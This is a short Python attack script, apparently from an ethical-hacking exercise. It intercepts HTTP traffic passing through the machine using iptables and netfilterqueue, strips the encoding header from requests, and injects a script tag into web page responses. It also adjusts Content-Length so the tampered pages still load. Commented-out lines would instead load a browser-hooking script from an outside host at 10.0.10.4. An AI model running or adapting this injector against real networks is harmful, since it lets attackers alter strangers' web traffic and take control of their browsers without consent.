import netfilterqueue
import scapy.all as sp
import optparse
import subprocess
import re


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--queue", dest="queue", help="Enter the queue no. which you want to create and send packet to.")
    (options, arguments) = parser.parse_args()

    if not options.queue:
        parser.error("Please input queue number, use --help for more info.")
    return options

def set_load(pkt,load):
    pkt[sp.Raw].load = load
    del pkt[sp.IP].len
    del pkt[sp.IP].chksum
    del pkt[sp.TCP].chksum

    return pkt

def process_packet(packet):

    scapy_packet  = sp.IP(packet.get_payload())
    if scapy_packet.haslayer(sp.Raw):
        load = scapy_packet[sp.Raw].load.decode(errors="replace")
        if scapy_packet.haslayer(sp.TCP):
            if scapy_packet[sp.TCP].dport == 80:
                print("[+] Request")
                load = re.sub("Accept-Encoding:.*?\\r\\n","",load)

            elif scapy_packet[sp.TCP].sport == 80:
                print("[+] Response")
                alert = "\n<script>alert('Bye');</script>\n"

                # Injection code have a problem with CORS error
                # injection_code = '<script src="http://10.0.10.4:3000/hook.js"></script>'
                ## \n<script src="http://10.0.10.4:3000/hook.js"></script>\n
                # load = load.replace("<body>", "<body>"+injection_code+alert)
                load = load.replace("<body>", "<body>"+alert)
                content_length_search = re.search(r"(?:Content-Length:\s)(\d*)",load)

                if content_length_search and "text/html" in load:
                    content_length = content_length_search.group(1)
                    # new_content_length = int(content_length) + len(injection_code) + len(alert)
                    new_content_length = int(content_length) + len(alert)
                    load = load.replace(content_length, str(new_content_length))

            if load!= scapy_packet[sp.Raw].load.decode(errors="replace"):
                new_packet = set_load(scapy_packet, load)
                packet.set_payload(bytes(new_packet))

    packet.accept()


def queue_creation(queue_no):

    # subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    # subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_no])

def flush(queue_no):

    # subprocess.call(['iptables', '-D', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    # subprocess.call(['iptables', '-D', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queue_no])
    subprocess.call(['iptables', '-D', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queue_no])


options = get_arguments()

try:
    queue_creation(options.queue)
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(int(options.queue), process_packet)
    queue.run()

except KeyboardInterrupt:
    print("[-] Detected CTRL + C .... Flushing queue...")
    flush(options.queue)
    flush(options.queue)

